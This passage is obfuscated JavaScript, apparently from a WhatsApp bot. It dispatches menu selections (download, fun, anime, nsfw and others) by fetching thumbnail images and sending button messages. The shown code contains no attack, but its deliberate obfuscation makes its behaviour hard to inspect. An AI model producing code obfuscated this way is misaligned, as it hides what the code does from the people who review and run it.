','cVcFKkGGrxH0idOGtq','zYb5yw5NihbLCG','ysbJB2DHBIbJBW','q2veBM8','EufHrui','B3bHEte4','zsbJB2rLihrOAq','yxnHBcbQyw5Nyq','BwLRB3nPyMe','ig5VCM1HBcbKAq','B2fKzxi','cGRIGki+ie5HBweG','y3vKzgXL','ig1LBwjHz2LRyq','igrHCgf0A2fUia','BMCGA2f5yq','Cgf0','lM1WmW','ywDV','zsbXCIbJB2rLpW','CMLWywrHihnHBa','zY51CW','zsbIyxDHAcbKyq','D2fPzNu','BwfRzxjTzw51','yMLQywTZyw5Hyq','zxnZywDL','y3yXlMPWzW','zgeGywTHBIbTzq','ywf0ig1HC2LOia','ywXHBwfU','y2HPDg9Nzq','ywGGBwvYAw5KDq','BMDHBIbLCMf0ia','rw1VAMKTtwvZCW','DgvYAwfRiciGyq','mgTIChmP','z2THBIWGyxbHBa','mJa5DM9MtxLX','8j+qScaQrMLSzxnPEG','ig5HAcbZzwTHCG','cGOk4OcIpIboyw1H','B3vYy2vFDxjSpq','rw1VAMKTsM95ua','tMv4DcdINQhVUi8','yw5Nzw15BwLUza','zsbZAw5P','Dc7IGj0','zYWGBwfRysbIAq','yMfRyq','q0XgqKi','ig1HDsbZzxDHia','zgLHigjHBgvZla','ihrHAhuSihnLBq','uKvtue9ou0u','Cg9UC2vnzxnZyq','C2fSywHHBG','yMvIzxjHCgeGAW','lM1Wna','BNnMD21V','u0Lor0Xfx1nfta','wNvcBfC','ChjVzhvJDeLTyq','BweSigjLCNnPAW','y3vJA29Sza','DhrWna','zsb0AguGDgv4Da','yw55ysbKDwe','DMLKzw8Qif9kDq','C3vJy2vZCW','DhvUz2D1igzPBa','BwvUz2HHzgfWAq','yMvZyxiGzgfYAq','BwfUz2f5DxrYAq','vLrOtee','ig1LBMnHCgfPia','yw5NignHBIbPia','CKDKCgO','yxn1BMfFExvRAq','Aw55ysWGBwvUAG','zsb0AguGDgfNBq','D2fUDcb0BYb1CW','C3bHBMS','vgLRDg9Rie11CW','v00UBxa0','yxvKAw8VBxaZ','u2vIzw5HCM55yq','zhPxD2jbCgPREq','C2HPAw5H','qwrHihrPChmGyq','D2Txsee','C3rJignVBw1HBG','ihrV','BwvUAMfKAsbZzq','kVcFK73VUi8Gwu9vvfvcrq','B2jHigjLyMvYyq','D3L0B0q','A1Lbr0C','DxaGC2f5yq','yKrgvhq','A25VDYbHBNLVBG','u3vIC2nYAwjLia','igrHBgfTigjLBG','C2eGBwvUz2HHCW','C2vYAwfSAxPLtq','AguGzM9YBsbVzG','s0Hzq3e','8j+qRsbgAwXLC2L6zq','ntaXmdKUANbN','tgvSywTPihLHBG','zs0Xna','ierpv05mt0ferq','zs0XmW','BwvUDsbJB21Tyq','BgLUigfRDsWGyq','ywrPigrPyw0Tza','ihLHBMCGA2L0yq','s2fSyxuGA2fTDq','BMDPzG','z2uGyxn1CgfUia','DhrWmG','ywTZyw5HihrPza','CgfRzsbMB3rVia','Ew91DhvIzs5JBW','EwfUzYbHA2fUia','yM9JAwW','mYa6kIa','Au9pD2K','DM8Xoa','C2fSzvbYAwnLqq','twvKAwfMAxjLia','igH0DhbZoI8VAq','CufNz2W','yxuGDgLRDg9Ria','4OcCu2vZDw5Nz3vO','C2fSywGGCgfZDa','yMvYAwTHBI4','A2vWywrHiefSBa','ig1LBgvTCgfYia','mJiLm0eLn0iLmG','ywXPigrHBIbJyq','ihnHDhuGDgvTyq','igjHBgfZyw4Gza','sgfSihrLCMjHAq','ysiGC2vSyw1Hia','AgfUEweGC2vRyq','tK9nt1i','ywXS','cGPFy2HVB3nLia','zMjHDwrPBYa','ig5PAcb2AwrLBW','xWRIGki+ie5VBw9Y','AgfNAweGzgfUia','mJK2mtzLr0frz00','zw5NzxiT','ywLS','4OcCsMLRysbRzxbP','jNrLEhq9','ywSGBwfRyw4Gza','r09qqvKGDMLHia','CMrPyw50BY1JAa','BwvKAwfZ','igTHBxuUiefRDq','q1PeBgW','BNLHihrHA3v0ia','igDJl2X1yxiGzW','4OsIWQKGFcbcEsa','qNv0Dg9Uie1LCW','BMDHBIbJyxjHia','Cg9WB2nP','C2fNzsboB21VCG','Cg9JqwW','ysbTzw5QywrPAW','iokeOSkPihWGqNKG','zhvSihzPzgvVia','Dgv4DhbYB21LBG','BhneA2i','A2fVCMLFBwL5yq','zgvY','ugvUzgvYAxrHyq','p2fWAwTLEt1VzG','CMvWBhKGBwvZCW','CgeGywDHBweGyq','mtGYndfImde0mG','zYWGA3vUAw5Nia','ihLHBMCGyMvYyq','ysaXigHHCMK','Dhj1DgG','zw5LCMfUipcFMi4G','C2vUDg9FAxn1EG','ysbZyw1HigrLBG','CgfWigTLihnHBa','wMXADMC','sMLRysbbBMrHia','yw1VBMD1CYaGyW','CgvU','u3vKywGGzgfWyq','DgfODw4TDgfODq','tvjKwgu','zNvSBe5HBwu','yZqXlMPWzW','4OcCs2vZDwTZzxnH','zsb0AguGB3DUzq','AKPHs3a','uhvYysbWDxjHia','yw4GDg9UDg9Uia','DhLWzq','CNmGoIOG','iciGzgKGzgvWyq','qvrtzvaRs0XOkW','A2eGA2fTDsbTyq','uuvTsui','4OUU4PIWiejbq0S','u0PHwfq','ChjVzhvJDe1LCW','AsbWzxj0yw1HlG','8j+sTsbhB3bHEq','ywrPigj1yxqGyq','zgfRigXHA3uSia','zgvSzxrL','t0rIEtDFtw9swq','AwDKBa','yxvKAw8VBxa0','kVcFK6CGu2L6zsbtza','cJuUifnLBgvZyq','zw5KC1DPDgG','DgLKDxjSywGGCW','ys7IGj0','cGRIGkiGwKvft05f','BxuGAMfKAwTHBG','AsbTzw1Lz2fUzW','AwHHDcbZAwfWyq','AwySigPHDwGGBa','DwTHBIb1BNr1AW','yxuUifnHBgfTia','ihnLA2fYyw5Nla','zxH0pq','ihLHBMCGzhvSDq','EhqVAMf2yxnJCG','Bw1HBMrF','zhjVCcbRDxrPCa','sgfSBYba','z2DVDgeGz3j1Ca','s2LYAw0GCgvYAq','zwjPAcbIywLRia','CgXHEsbXDwvYEq','lMHLCM9RDwfWCa','AhvSDwbGya','DwfOig5Lz2fYyq','ywH1BIbPBMK/','Bg9Zzq','CxjFB3zVmtG','C2vnzxnZywDL','igrPyw0GzgfUia','zYb0zxjIywLRia','yxn1CgfU','EweGy3vRDxaGCW','ig5PBgeGC2v0Aq','tePftu0','Aw4GA2fTDsbKBW','BwfZysbSywX1la','cGKjcqKkx1vWBa','ysb0Awr1CIbRyq','teLJCu4','B0Dvr1G','ysbZyw1Hig9Yyq','AxjPlG','zwXPAgf0igTLia','EfrinM9mzdG','zw51','qwvqtxe','q2LUDgeGywrHBa','ihLHAxr1ihbHCW','BMCU','zgXkyu8','A2vTyMfSAsWGyq','kK1freLbrKLsrq','CMvNAxn0zxiGBW','AwXLl2nInMfHyq','su9QshO','EwfUzYbTzw1Iyq','z2v0','zMvTzg9T','txLsBu4','re9dvu1ftLq','BIbIB3rUEweG','BgfTihvZywHHBG','zxnJzxnPyxbH','DgLRDg9RyxvKAq','Cu9xse8','u2LHCgeGBMfTyq','CxjFzgfUyteZ','BMDHDcbIzw5JAq','ihbLCMDPigPHDq','ignPBNrHihnHBq','zwXLz3jHBv9ZDa','DgfODwfUihrHBG','igeGBgLUA18','igjHEwfYihbHAW','Ahr0Chm6lY92yq','u2vSyxnH','ww91DhvIzsbnCa','yMfNAwfUihrLCG','zgfNyw5NigTHAW','igTHBxuGyMvSDq','Cg9Rzq','Dxr1lMjLlZfYxW','DK1cv0O','44cfifnPEMuGoIa','sKftqsbtrvDbia','BNnMD19UzwTVxW','y29UDgv4DeLUzG','ywrPigT1C2LYia','zw1IyxLHCMfUcG','C2vSzwn0ihrOzq','BcbWywrHigTHBa','yMvYBgf0AwG/4OcD','D2LUCNK','sgfPyLq','mMqWyZiXotvHyG','z2fJAgeGy2vJyq','BgLUAW','yw5HAYbZyxLHia','zxH0zw5Kzwruzq','yxbH','zsb0AguGC3rVCG','ywXHBMCSigTLCG','qM90','zw5Nyw4GAgfYDa','ndqYndm4ywzLoa','u3b5Efi','zgfYAxbHzgeGAa','otC3zJqUANbN','C2vWzxj0AsbOyq','BNrHAYb3ysb1CG','AweGEwfPDhuGDG','tvPlv2m','C2vUze1LC3nHzW','AwXLlZi3nZe2mW','BML0ysb5yw5Nia','Ahr0Chm6lY9NlG','DwTHihnHBweGAW','zsb0AguGywXSBq','zgfUEweUiejHBa','zMXVB3i','igTLDgLRysbRyq','ihrOAxmGC2nYAq','yw5HBIWGDgfWAq','tw9QAs0','lNbOCd91CMW9','B2HZzwH1BG','yYbZAwfWysb5yq','BxvHig9Yyw5Nia','z2uGD2vSy29Tzq','uK1js2K','As4GtwfRyw55yq','yxnPBcbeAwrHCa','z2fUigPPA2eGAW','uefztuvova','EwfFA2fR','yxL1','rwLNA3y','C291CMnLignVza','AxnHig1LBgfRDq','nJe5otGWmZaXnq','t2PbwgO','ihrLDgfUz2DHla','BwvVDW','Ae1hwMC','l3bFmJaZmM13yG','C2fNzq','C3vSzsbZyw1Wzq','ExrTCdrKB2m','igTPDgeGA2vYAG','Awr1CI7IGj0G4Octifa','DgHPz2HZ','ExvRAw5V','ExrTCdmGw2XPBG','udqk8j+KOcbjrca6ia','zw4/DhLWzt1Ryq','44cfieXPBMSGoIa','cVcFJymGvMLLD3m6ia','Dw5KzwzPBMvK','C2v3yv8XCa','C3vWyw4VDJiV','zM9VDgvYvgv4Da','Bw91BNqXmdaW','ig1LzgLHihLVDq','CgvYBMfOignPBG','igTHCMvUysbOyq','yw55ywSGyMvSyq','rxjVCG','DgLKywTFA2fR','ugLSAwGGC2fSyq','Denxz0q','AsbHA2fUigfKyq','A3rwvKG','C2fZDwTL','CMTYzwfZAsbKyq','ysWGAMLRysbRyq','yMLZysbTzw1IDq','zJa0zMm5zgqYza','DsbZyw5Nzq','AhvIDw5Nyw5UEq','ChjPBwfYEq','DwSGBwfQDsWGyG','z0z1vwi','yw4GA2vIB2rVAa','zsbLzMzLy3qGBq','yw4GDgHLigXPBq','u1jjBeq','A2fUBMe','BIbIzxjTAw1WAq','wc9bpq','DgfNBwvUDq','BNL1CMWUy29TlW','yvvUzfi','vgvYAMfKAsbRzq','v1znC3i','DweGChjPysbTzq','Dw50DwSGBwvUzW','8j+uLIbmAxn0ifnLDW','yw5NigrHCMLWyq','wvPIwvC','A3vJAw5N','u2frz1C','BNLHigTSBYbTyq','zNvUBwvUDq','Ag11lG','A2fZlcbKBgW','m3WXFdj8nhWW','A2vWywrHig1LCG','kKXPBMSQidOG','C2fTzs1VCMLNAq','zwXHAYb0yxDHia','ie9wtYWGrefoqq','ysb5yw5NiefUza','ig5PBMDNywXPBG','A2fSBYb0Awr1CG','uMvNyxjKiea','B21Tyw5KxW','4PYtie9xtKvs','ywSGAw5NAw4GDa','EweU','yxbPig9Yyw5Nia','rxrQDeu','mZu5ntmXote1oq','AwSGyw5HAYbTyq','ChrF','z2fUDgKGBMfTyq','C2LOigPVBwjSBW','CgvRzxjQywfUia','rw10A0u','EweGBMDPBgvYia','ihrHA3v0ig1LBG','CxjFzgfUyte4','zYbKyxbHDcbTzq','AxqSigXHBhuGCW','ywLRihvUDhvRia','DhuGAgfRigTHBq','iefUzgeSihrLDa','vvbXu1a','BIb5yw5NihrPza','s2XPAYbUzxH0ia','A2vTB25VBwLTAq','wu1Zwu10BMXUyG','yw5HigrHBIbIAq','y3LVCKm','qxvKAw8GkdeYoa','zs0XmG','ywGGBM9TB3jFyq','B3rLlcb0zxj1CW','iePHBMDHBIbWzq','BIbnyxn1A2THBG','ChvZC3LFANbN','ihrLDgfWAsb0Aq','AfrusMe','u2DMsKC','rw1VAMKTv2HHDa','CxvYyw4TyxbPlq','EhrnzxnZywDL','iejPC2fRDsbJDq','DsbHCgeSihrHCa','8j+pHIbdB250CMLIDq','BIbIB3rUEwe','CgXHEq','yM9VAY0','yxnH','igfRyw4GBgLOyq','yxvYyq','Dgv4Da','Cg1LBNuGy29TBq','Ahr0Chm6lY9TBq','igjVAg9UzYWGAq','jMnVBg9YpwjSDq','BI4GvgfWAsWGyG','CgKVDJiVAw1NlW','ywTHBIbTzw1Izq','DgLKywSGBxvUyW','sNLwzwC','BgfUz3n1BMFWN5Ih','sgLKDxaGAxr1ia','ywXHAgTHBIbVCG','AwTPyw4SigTLyW','ysbPA3v0ihrLCG','8j+oPIaQwsbuicbqia','ChbJB3vWBgu','A2fNyv9RB3vRBW','zw1LCMXHBMDHBG','4OcCt3jHBMCGyMLQ','vvne','ChjVzhvJDeLK','Afroz2y','AxjPihnHEweGCW','BMCGANvQDxiGBa','zY4UpZ/IGj0','tMv4DcaGzM9Yia','v3H4A1G'];_0x5499=function(){return _0xf13ca0;};return _0x5499();}if(sub_yt_zeeone_ofc==_0x134458(0xa7c,0x8cd,0xcc4,0xd27)){console[_0x134458(0xa47,0x80e,0x5e9,0x624)](color(time,'magenta'),color('List\x20messa'+_0x15af3d(0xc2f,0x10b1,0xcb4,0x756)+'nu'));var animkzka=await getBuffer(_0x134458(0x4b4,0x155,0x96,0x717)+_0x134458(0x73a,0x6df,0xb8b,0xc12)+_0x15af3d(0x8f3,0x724,0xd5c,0x67d)+_0x15af3d(0x8e9,0x4d8,0x9db,0x5ac)+_0x134458(0x69f,0x621,0x602,0x533));const _0x3672f5={};_0x3672f5[_0x15af3d(0x6ec,0xaa8,0x724,0xa71)+'t']=_0x15af3d(0xa58,0xa6f,0x7c9,0x635);const _0x26ff47={};_0x26ff47[_0x134458(0xae0,0xd9d,0xb6a,0xe1c)]='Command',_0x26ff47['buttonText']=_0x3672f5,_0x26ff47[_0x134458(0x8ff,0x7ba,0x85a,0x441)]=0x1;const _0x12b2f5={};_0x12b2f5[_0x134458(0x599,0x218,0x408,0x12c)+'t']=_0x134458(0x9ea,0xb3b,0x849,0x58c);const _0x51f7e3={};_0x51f7e3[_0x15af3d(0xc33,0x939,0xc1b,0xd27)]=_0x134458(0x2c0,0x79f,0x175,0x675),_0x51f7e3['buttonText']=_0x12b2f5,_0x51f7e3[_0x134458(0x8ff,0xaa0,0x95c,0x76a)]=0x1,sendButLocation(from,animemenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark['split']('@')[-0x1d60+-0x1a*0xe6+-0x1194*-0x3],animkzka,[_0x26ff47,_0x51f7e3],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc==_0x15af3d(0x7b0,0x650,0x872,0x9df)+'u'){console[_0x134458(0xa47,0xcbb,0x936,0xb42)](color(time,_0x134458(0x64d,0x9bc,0x79a,0x2e8)),color(_0x134458(0x2cc,-0x17d,0x249,0x3b1)+_0x15af3d(0x512,0xb3,0x114,0x521)+'menu'));var converkdk=await getBuffer('https://te'+_0x134458(0x73a,0x28d,0x714,0x5ba)+_0x134458(0x27d,-0x234,0x58b,0x217)+'65e7d9ab70'+'1b207.jpg');const _0x3752f8={};_0x3752f8[_0x134458(0x599,0x2fb,0x33f,0x49e)+'t']=_0x134458(0x905,0x462,0x880,0x6ca);const _0x45afdc={};_0x45afdc['buttonId']=_0x15af3d(0x654,0x391,0x4bd,0x6e2),_0x45afdc[_0x134458(0x454,0x39f,0x780,0x8e4)]=_0x3752f8,_0x45afdc[_0x134458(0x8ff,0x618,0x790,0x40a)]=0x1;const _0x53cbd0={};_0x53cbd0[_0x15af3d(0x6ec,0x331,0x2b9,0x9ea)+'t']='✓\x20OWNER';const _0x4bb487={};_0x4bb487['buttonId']=_0x15af3d(0x413,0x6a8,0x28b,0x5ea),_0x4bb487[_0x15af3d(0x5a7,0x19b,0x955,0x952)]=_0x53cbd0,_0x4bb487[_0x15af3d(0xa52,0xeec,0x79c,0xe78)]=0x1,sendButLocation(from,convertmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x15af3d(0xb3b,0x740,0xd01,0xaaa)+ini_mark['split']('@')[-0x1d0d+-0x23d2+0x40df],converkdk,[_0x45afdc,_0x4bb487],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc==_0x134458(0x702,0xbae,0x557,0xa0d)){console['log'](color(time,'magenta'),color(_0x15af3d(0x41f,0xd9,0x357,0x1a2)+_0x134458(0x8a8,0x764,0xabe,0xa1e)+_0x15af3d(0x845,0xabf,0x74d,0x9b6)));var nsfwkak=await getBuffer(_0x15af3d(0x607,0x1f1,0x5d3,0x30d)+'legra.ph/f'+'ile/487eeb'+_0x15af3d(0xc08,0xec2,0xc07,0xe07)+'ca37c.jpg');const _0x5489fd={};_0x5489fd[_0x15af3d(0x6ec,0x2de,0x8ff,0x76a)+'t']=_0x134458(0x905,0xb88,0x4ae,0xa72);const _0x59da4e={};_0x59da4e[_0x15af3d(0xc33,0xc5e,0xf12,0xa14)]=_0x134458(0x501,0x405,0x806,0x959),_0x59da4e[_0x15af3d(0x5a7,0x132,0xa40,0x263)]=_0x5489fd,_0x59da4e[_0x134458(0x8ff,0xc79,0xd4e,0xcf9)]=0x1;const _0x248f4e={};_0x248f4e[_0x134458(0x599,0x5d5,0x2ab,0x7f4)+'t']=_0x134458(0x9ea,0xd7c,0xe7d,0x85e);const _0xe6f4a={};_0xe6f4a[_0x134458(0xae0,0x736,0xcc5,0xdea)]=_0x134458(0x2c0,-0x198,0x6f6,-0x23),_0xe6f4a['buttonText']=_0x248f4e,_0xe6f4a[_0x134458(0x8ff,0xccf,0x55b,0x6ff)]=0x1,sendButLocation(from,nsfwmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x15af3d(0xb3b,0xeea,0x753,0xe35)+ini_mark[_0x134458(0x3ec,0x37,0x34e,0x8a8)]('@')[-0x1*0x445+-0x20d6+0x251b*0x1],nsfwkak,[_0x59da4e,_0xe6f4a],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc==_0x15af3d(0xc49,0xea4,0xf66,0xa1e)+'u'){console['log'](color(time,_0x15af3d(0x7a0,0xb63,0xa37,0xbdf)),color('List\x20messa'+_0x15af3d(0x9fb,0x97d,0xa64,0x722)+_0x15af3d(0x845,0x36f,0xa3d,0xcf8)));var asupanak=await getBuffer(_0x15af3d(0x607,0x4c7,0x843,0x929)+'legra.ph/f'+_0x134458(0x947,0xb6b,0x5b4,0x7ed)+_0x15af3d(0xa3b,0xd5c,0xcd2,0x695)+_0x15af3d(0x38f,0x2af,0x48a,0x5f4));const _0x1d5569={};_0x1d5569[_0x134458(0x599,0xa52,0x487,0x283)+'t']='⋮☰\x20BACK';const _0xcdcf71={};_0xcdcf71[_0x134458(0xae0,0xa3b,0x88d,0xf14)]='Command',_0xcdcf71[_0x134458(0x454,0x62,-0x8f,0x5ab)]=_0x1d5569,_0xcdcf71['type']=0x1;const _0x456c72={};_0x456c72[_0x15af3d(0x6ec,0x548,0x6ec,0x79f)+'t']=_0x15af3d(0xb3d,0x80e,0x6eb,0xdc9);const _0x55d4f8={};_0x55d4f8[_0x134458(0xae0,0x89c,0xf46,0x83d)]=_0x15af3d(0x413,-0xd8,0x611,0x34c),_0x55d4f8['buttonText']=_0x456c72,_0x55d4f8[_0x134458(0x8ff,0x637,0x781,0x4eb)]=0x1,sendButLocation(from,asupanmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark[_0x134458(0x3ec,0x502,0x4f,0x2c1)]('@')[-0x1392+0xf77+0x41b*0x1],asupanak,[_0xcdcf71,_0x55d4f8],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc==_0x134458(0x729,0xadf,0x90f,0x72f)+'ot'){console[_0x134458(0xa47,0xdfa,0x56f,0xd19)](color(time,_0x15af3d(0x7a0,0x80f,0x57d,0x62d)),color(_0x15af3d(0x858,0x8fc,0xa1f,0x74a)+_0x134458(0xa23,0x57d,0xa04,0x87d)+_0x134458(0x158,0x2f6,-0x1fe,0x15e)+_0x134458(0x3d2,0x7f0,0x4f8,0x282)+'mbnail'));var allmenuk=await getBuffer('https://te'+_0x134458(0x73a,0x3cc,0x2e6,0x499)+_0x134458(0x983,0x897,0x98f,0x5c3)+_0x134458(0x5d9,0x9dc,0x617,0x450)+'69280.jpg');const _0x25016b={};_0x25016b[_0x134458(0x599,0x3e7,0x141,0x5ae)+'t']=_0x15af3d(0xa58,0x7f4,0x80a,0xa4f);const _0x3f8940={};_0x3f8940[_0x15af3d(0xc33,0x78b,0x1107,0x943)]=_0x15af3d(0x654,0x8c8,0x7da,0x56e),_0x3f8940['buttonText']=_0x25016b,_0x3f8940['type']=0x1;const _0x35eec7={};_0x35eec7[_0x15af3d(0x6ec,0x971,0x464,0x6ab)+'t']=_0x15af3d(0xb3d,0xe39,0xd64,0xc1c);const _0x493b1e={};_0x493b1e[_0x15af3d(0xc33,0xede,0xe58,0xacc)]='owner',_0x493b1e[_0x15af3d(0x5a7,0x19e,0x4e9,0x6d9)]=_0x35eec7,_0x493b1e[_0x134458(0x8ff,0x8d8,0xbfa,0xa66)]=0x1,sendButLocation(from,allmenu(kyun,os,prefix,wita,wit,ucapannya2,timuu,status,wa_version,mcc,mnc,os_version,device_manufacturer,device_model,alfa,alfa1,thisDay,ini_tanggal,totalchat,hit_today,ini_gcchat,latensii),''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark[_0x134458(0x3ec,0x640,0x3a3,0x47c)]('@')[0xcab+0x2*-0x10af+0x7*0x2f5],allmenuk,[_0x3f8940,_0x493b1e],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc==_0x134458(0x3d8,0x2fb,0x81,0x56c)+'nu'){console[_0x134458(0xa47,0x5d7,0x914,0xf00)](color(time,_0x15af3d(0x7a0,0x92f,0x5fc,0xaa0)),color(_0x134458(0x2cc,0x90,0x11,0xd8)+_0x15af3d(0x89b,0xc65,0xd39,0x616)+'dmenu'));var downloadlsl=await getBuffer(_0x15af3d(0x607,0x37a,0x5dc,0x39e)+'legra.ph/f'+_0x134458(0x324,0xcc,0xd8,0x39)+_0x134458(0x9c2,0xcc9,0xa90,0xc9d)+_0x134458(0x6bc,0x1e3,0xb08,0x798));const _0x2b072f={};_0x2b072f['displayTex'+'t']=_0x134458(0x905,0x684,0x6f0,0x480);const _0x64df13={};_0x64df13[_0x15af3d(0xc33,0xfda,0xa90,0xd02)]='Command',_0x64df13[_0x134458(0x454,0x1e2,0x49e,0x6e6)]=_0x2b072f,_0x64df13[_0x15af3d(0xa52,0xcd6,0x706,0x684)]=0x1;const _0x54657c={};_0x54657c[_0x15af3d(0x6ec,0x997,0x31a,0x7a4)+'t']=_0x134458(0x9ea,0xd8e,0xe6c,0xca1);const _0x25eee8={};_0x25eee8[_0x134458(0xae0,0xaff,0x6e3,0x6b6)]='owner',_0x25eee8[_0x134458(0x454,0x7c3,0x1c2,0x7b7)]=_0x54657c,_0x25eee8[_0x134458(0x8ff,0x4b5,0x861,0x581)]=0x1,sendButLocation(from,downloadmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x15af3d(0xb3b,0x7c5,0xfe9,0x90c)+ini_mark[_0x15af3d(0x53f,0x515,0x744,0x4f1)]('@')[0x3*0xcf+0xf95*-0x2+0x1cbd],downloadlsl,[_0x64df13,_0x25eee8],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc==_0x134458(0x9dc,0xb49,0xbbf,0x605)){console[_0x15af3d(0xb9a,0x93e,0xd67,0x8d8)](color(time,_0x15af3d(0x7a0,0x705,0x4a6,0x681)),color('List\x20messa'+_0x15af3d(0x3f5,-0x77,0x352,0x70c)));var funmenujs=await getBuffer(_0x134458(0x4b4,0x178,-0x39,0x2cb)+_0x134458(0x73a,0x2a2,0x690,0x943)+_0x134458(0x415,0x677,0x1f7,0x420)+'6a8f7fc99d'+_0x134458(0x473,0xef,0x543,0x20d));const _0x38f1e7={};_0x38f1e7[_0x134458(0x599,0x53d,0xa54,0xa10)+'t']=_0x134458(0x905,0xc42,0xa78,0xd3e);const _0x2d6002={};_0x2d6002['buttonId']=_0x134458(0x501,0x16,0x85c,0x804),_0x2d6002[_0x15af3d(0x5a7,0x997,0x9f2,0x22f)]=_0x38f1e7,_0x2d6002[_0x134458(0x8ff,0x762,0x4bd,0xa65)]=0x1;const _0x3e38a1={};_0x3e38a1[_0x134458(0x599,0x9f6,0x317,0x990)+'t']=_0x134458(0x9ea,0x8b5,0xd46,0xbe9);const _0x52dba2={};_0x52dba2['buttonId']=_0x134458(0x2c0,0xf1,0x787,0x364),_0x52dba2[_0x15af3d(0x5a7,0x9b8,0x255,0x9b1)]=_0x3e38a1,_0x52dba2[_0x15af3d(0xa52,0xe63,0x583,0x5d3)]=0x1,sendButLocation(from,funmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark[_0x15af3d(0x53f,0x2cf,0x731,0x2fc)]('@')[0x1bbd+0x24c6+-0x4083],funmenujs,[_0x2d6002,_0x52dba2],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc==_0x134458(0x849,0x838,0x893,0x89a)){console['log'](color(time,_0x15af3d(0x7a0,0x39a,0x515,0x5b4)),color('List\x20messa'+'ge\x20makerme'+'nu'));var makermenksk=await getBuffer('https://te'+'legra.ph/f'+_0x15af3d(0xc18,0x109b,0xa77,0xa9d)+_0x15af3d(0xbbd,0xbb6,0x925,0xf07)+_0x134458(0x5a9,0xc4,0x1dc,0x930));const _0x57c86d={};_0x57c86d['displayTex'+'t']=_0x15af3d(0xa58,0x63d,0xa0e,0xb82);const _0x28dac7={};_0x28dac7[_0x15af3d(0xc33,0xd61,0x83b,0xbdd)]='Command',_0x28dac7[_0x15af3d(0x5a7,0x759,0x196,0xa6d)]=_0x57c86d,_0x28dac7[_0x134458(0x8ff,0xaa1,0x4db,0x94a)]=0x1;const _0x388f2e={};_0x388f2e[_0x15af3d(0x6ec,0x6f7,0x632,0x671)+'t']=_0x134458(0x9ea,0xe4b,0xde1,0x977);const _0x1e2a9e={};_0x1e2a9e['buttonId']=_0x134458(0x2c0,-0x1f4,-0xef,-0x1c5),_0x1e2a9e[_0x15af3d(0x5a7,0x624,0x4d3,0x4c7)]=_0x388f2e,_0x1e2a9e['type']=0x1,sendButLocation(from,makermenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x134458(0x9e8,0xd88,0xbfd,0xd25)+ini_mark[_0x134458(0x3ec,0x664,0x68e,0x5e2)]('@')[-0x23ec+-0x1f72+0x435e],makermenksk,[_0x28dac7,_0x1e2a9e],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc==_0x134458(0x8e0,0xa75,0x7d5,0xcf1)+'u'){console[_0x15af3d(0xb9a,0xffa,0x94c,0x920)](color(time,_0x134458(0x64d,0x5d5,0x22d,0x8ca)),color(_0x15af3d(0x41f,0x148,0x461,0x1e9)+_0x15af3d(0x518,0x46d,0x29b,0x50a)+'menu'));var textjskzb=await getBuffer(_0x134458(0x4b4,0x360,0x5d4,0x255)+_0x134458(0x73a,0xb02,0x2f8,0x24d)+_0x15af3d(0x849,0x82e,0x3c3,0xcf3)+_0x15af3d(0x583,0x16b,0x6d0,0x8f7)+_0x15af3d(0x9f0,0xe5a,0xa61,0x9c8));const _0xa7b074={};_0xa7b074[_0x134458(0x599,0x4b4,0xd5,0x67a)+'t']=_0x15af3d(0xa58,0xea7,0xdb6,0xec0);const _0x51b86e={};_0x51b86e['buttonId']=_0x15af3d(0x654,0x228,0x9cc,0x2bf),_0x51b86e[_0x15af3d(0x5a7,0x797,0x84e,0x5ed)]=_0xa7b074,_0x51b86e['type']=0x1;const _0x409a26={};_0x409a26['displayTex'+'t']='✓\x20OWNER';const _0x1a1fbe={};_0x1a1fbe['buttonId']='owner',_0x1a1fbe['buttonText']=_0x409a26,_0x1a1fbe[_0x15af3d(0xa52,0xd68,0xbad,0x604)]=0x1,sendButLocation(from,textpromenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x15af3d(0xb3b,0x7c0,0xa18,0xdc2)+ini_mark[_0x15af3d(0x53f,0x1e9,0x3d3,0xbe)]('@')[-0x112e+0xc8*-0xe+0x1c1e],textjskzb,[_0x51b86e,_0x1a1fbe],{'contextInfo':{'mentionedJid':[ini_mark]}}),await limitAdd(sender,limit);}if(sub_yt_zeeone_ofc==_0x15af3d(0xc7b,0xd1a,0xeb5,0x793)+'nu'){console[_0x15af3d(0xb9a,0xf0c,0x8e9,0xb15)](color(time,_0x134458(0x64d,0x8de,0x916,0x511)),color('List\x20messa'+_0x15af3d(0xc37,0x9ca,0xc56,0xbda)+'ymenu'));var pdkdk=await getBuffer(_0x134458(0x4b4,0x978,0x8cf,0x43)+'legra.ph/f'+_0x134458(0xaad,0xdb4,0xd3e,0xd56)+_0x134458(0xad3,0x849,0xe40,0xbd4)+_0x15af3d(0x3af,0x866,0xeb,0x580));const _0x1eb9ef={};_0x1eb9ef['displayTex'+'t']=_0x15af3d(0xa58,0xb78,0xd56,0x937);const _0x4667ed={};_0x4667ed['buttonId']='Command',_0x4667ed[_0x134458(0x454,0x18e,-0x3e,-0x9c)]=_0x1eb9ef,_0x4667ed[_0x134458(0x8ff,0x60f,0xb1c,0xc85)]=0x1;const 